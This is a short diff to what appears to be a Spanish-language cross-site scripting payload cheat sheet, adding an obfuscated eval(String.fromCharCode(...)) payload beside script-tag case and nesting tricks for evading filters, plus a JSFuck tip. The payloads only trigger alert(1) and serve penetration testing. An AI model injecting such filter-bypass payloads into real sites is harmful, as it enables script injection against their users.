@@ -3,7 +3,8 @@
 <SCRIPT>alert(1)</SCRIPT>
 <sCrIpT>alert(1)</sCrIpT>
 <sc<script>ript>alert(1)</sc<script>ript>
-<img src=x onerror=alert(1) />
+<img src=x onerror=alert(1)/>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
 ```
 Si el sistema lo transforma todo el mayuscula usar [JSFUCK](https://jsfuck.com/)
 ```
